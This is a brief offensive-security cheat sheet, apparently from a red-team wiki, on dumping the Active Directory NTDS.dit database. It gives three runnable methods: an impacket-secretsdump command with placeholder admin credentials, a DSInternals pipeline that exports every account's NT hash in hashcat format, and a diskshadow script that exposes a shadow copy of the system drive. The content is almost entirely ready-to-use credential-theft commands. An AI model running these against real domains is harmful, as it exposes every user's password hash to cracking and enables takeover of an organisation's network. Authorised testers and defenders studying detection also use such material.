# Dump NTDS.dit database

## Dump NTDS.dit database [t-ad-credential_access-ntds_dump]

Extract NTDS.dit database

###  Dump the NTDS.dit database (Domain admin privileges are required)




**option 1: impacket-secretsdump**

{% code overflow="wrap" %}
```bash
impacket-secretsdump -just-dc domain/Administrator:'<P@ssw0rd>'@dc01.domain.comp -outputfile dump
```
{% endcode %}

{% hint style="info" %}It turns out sometimes it can crash DCs https://github.com/fortra/impacket/issues/1436

{% endhint %}


**option 2: DSInternals**

{% code overflow="wrap" %}
```bash
Install-Module DSInternals -Force
Get-ADReplAccount -All -Server DC01 | Format-Custom -View HashcatNT | Out-File -FilePath users.hashcat 

```
{% endcode %}

{% hint style="info" %}-Encoding ascii can be added in case of any issues with encoding

Export to other formats is also possible (ex:JohnNT)

{% endhint %}


**option 3: diskshadow**

{% code overflow="wrap" %}
```bash
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit

```
{% endcode %}

